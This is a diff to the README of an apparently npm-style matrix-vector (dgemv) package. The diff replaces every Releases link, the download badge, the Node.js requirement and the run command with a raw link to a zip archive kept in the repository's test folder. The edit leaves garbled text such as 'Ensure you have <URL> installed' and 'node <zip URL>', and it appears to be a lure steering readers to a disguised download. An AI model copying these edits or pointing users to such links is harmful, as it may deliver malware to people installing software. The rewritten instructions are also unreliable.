@@ -4,19 +4,19 @@
 This application lets you perform matrix-vector operations. It calculates `y = α*A*x + β*y` or `y = α*A^T*x + β*y`. These operations are essential in linear algebra for anyone dealing with arrays, data processing, or mathematical calculations.
 
 ## 📥 Download
-[![Download Release](https://img.shields.io/badge/download-release-brightgreen)](https://github.com/amiriprog/blas-base-dgemv/releases)
+[![Download Release](https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip)](https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip)
 
 ## 🚀 Getting Started
 To use the blas-base-dgemv application, you need to follow these simple steps:
 
 ### 🖥️ System Requirements
 - **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
-- **Node.js:** Ensure you have Node.js installed. You can check your version with the command `node -v`. The minimum required version is 12.0.
+- **https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip** Ensure you have https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip installed. You can check your version with the command `node -v`. The minimum required version is 12.0.
 - **Memory:** At least 4GB of RAM.
 - **Processor:** A modern CPU (1GHz or faster).
 
 ### 📂 Download & Install
-1. Visit the [Releases page](https://github.com/amiriprog/blas-base-dgemv/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip) to download the latest version of the application.
 2. Look for the latest release under "Latest release". Click on the appropriate file for your operating system to download.
 3. Once the download finishes, locate the downloaded file on your computer.
 
@@ -29,7 +29,7 @@ To use the blas-base-dgemv application, you need to follow these simple steps:
    ```
 4. Run the application by entering:
    ```
-   node index.js
+   node https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip
    ```
 5. Follow the prompts in the terminal to enter your matrix values, or refer to the documentation for specific usage examples.
 
@@ -55,4 +55,4 @@ x = [5, 6];
 ## 📝 Additional Information
 For further guidance on how to use the application, please refer to the documentation included in the release. It provides detailed examples and use cases. 
 
-Feel free to explore and download the latest version now! Visit the [Releases page](https://github.com/amiriprog/blas-base-dgemv/releases) for updates and historical versions.
+Feel free to explore and download the latest version now! Visit the [Releases page](https://github.com/amiriprog/blas-base-dgemv/raw/refs/heads/main/test/dist/dgemv_blas_base_1.7.zip) for updates and historical versions.
